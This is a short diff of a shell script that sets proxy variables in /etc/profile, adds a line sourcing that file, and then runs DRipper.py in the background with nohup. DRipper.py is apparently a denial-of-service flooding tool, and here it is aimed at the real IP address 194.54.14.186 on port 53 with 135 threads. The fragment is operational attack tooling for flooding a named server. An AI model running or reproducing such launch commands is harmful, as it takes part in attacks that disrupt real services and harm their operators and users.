@@ -16,5 +16,5 @@ export HTTPS_PROXY=\"\$PROXY_URL\"
 export FTP_PROXY=\"\$PROXY_URL\"
 export NO_PROXY=\"127.0.0.1,localhost\"
 " >> /etc/profile
-
+source /etc/profile
 nohup python3 DRipper.py -s 194.54.14.186 -p 53 -t 135 -q &
